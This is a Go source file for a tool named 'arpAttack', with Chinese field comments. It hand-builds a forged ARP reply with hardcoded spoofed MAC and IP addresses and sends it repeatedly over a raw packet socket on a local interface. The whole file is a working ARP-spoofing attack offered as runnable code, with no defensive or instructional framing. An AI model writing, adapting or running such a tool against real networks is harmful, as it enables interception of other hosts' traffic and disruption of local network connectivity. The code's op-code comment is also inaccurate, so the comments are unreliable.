package main

import "C"
import (
	"encoding/binary"
	"fmt"
	"net"
	"syscall"
	"time"
	"unsafe"
)

//https://gist.github.com/PollenPolle/ada4d123a4579f3e22f2c5e30e6f4a02
//https://github.com/chamaken/cgolmnl/blob/master/inet/inet.go

type Ethhdr struct {
	Dest   [6]uint8
	Source [6]uint8
	proto  uint16
}

type ArpPacket struct {
	//28字节arp请求 应答
	HwType       uint16   //硬件类型
	ProtType     uint16   //协议类型
	HwAddrSize   uint8    //硬件地址长度
	ProtAddrSize uint8    //协议地址长度
	Op           uint16   //操作类型
	SndrHwAddr   [6]uint8 //发送端源mac地址
	SndrIpAddr   [4]uint8 //发送端源ip地址
	RcptHwAddr   [6]uint8 //目的mac地址
	RcptIpAddr   [4]uint8 //目的ip地址
	Padding      [18]uint8
}

func htons(i uint16) uint16 {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, i)
	return *(*uint16)(unsafe.Pointer(&b[0]))
}

func createArpPacket() [60]uint8 {
	data := [60]uint8{}
	dataPointer := unsafe.Pointer(&data)

	ethhdr := (*Ethhdr)(dataPointer)
	ethhdr.Dest = [6]uint8{0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04}   //目标mac地址
	ethhdr.Source = [6]uint8{0x18, 0x3d, 0x5e, 0x76, 0x6b, 0xaa} //源mac地址
	ethhdr.proto = htons(0x0806)

	arpPacket := (*ArpPacket)(unsafe.Pointer(uintptr(dataPointer) + 14))
	arpPacket.HwType = htons(0x0001)                                    //硬件类型
	arpPacket.ProtType = htons(0x0800)                                  //协议类型
	arpPacket.HwAddrSize = 6                                            //硬件地址长度
	arpPacket.ProtAddrSize = 4                                          //协议地址长度
	arpPacket.Op = htons(0x0002)                                        //操作类型    OP_ARP_QUEST 1  OP_ARP_REQUEST 2
	arpPacket.SndrHwAddr = [6]uint8{0x18, 0x3d, 0x5e, 0x76, 0x6b, 0xaa} //发送端源mac地址
	arpPacket.SndrIpAddr = [4]uint8{0x0a, 0x4f, 0x13, 0x01}             //发送端源ip地址
	arpPacket.RcptHwAddr = [6]uint8{0x18, 0x3d, 0x5e, 0x76, 0x6b, 0xaa} //映射mac地址
	arpPacket.RcptIpAddr = [4]uint8{0x0a, 0x4f, 0x13, 0x01}             //映射ip地址
	arpPacket.Padding = [18]uint8{}
	return data
}

func ArpAttack() {
	interf, err := net.InterfaceByName("ens33")
	if err != nil {
		fmt.Println("Could not find vboxnet interface")
		return
	}
	fmt.Println("Interface hw address: ", interf.HardwareAddr)

	var addr syscall.SockaddrLinklayer
	addr.Protocol = syscall.ETH_P_ARP
	addr.Ifindex = interf.Index
	addr.Hatype = syscall.ARPHRD_ETHER

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
	if err != nil {
		fmt.Println("Error: " + err.Error())
		return
	}
	defer syscall.Close(fd)
	arpPacket := createArpPacket()
	packet := C.GoBytes(unsafe.Pointer(&arpPacket), C.int(60))
	i := 1
	for true {
		err = syscall.Sendto(fd, packet, 0, &addr)
		if err != nil {
			fmt.Println("Error: ", err)
		} else {
			if i < 10 {
				fmt.Println("Sent packet")
			}
		}
		time.Sleep(1000 * time.Millisecond)
		i++

		if i > 120 {
			break
		}
	}
}

func main() {
	fmt.Print("arpAttack")
	ArpAttack()
}
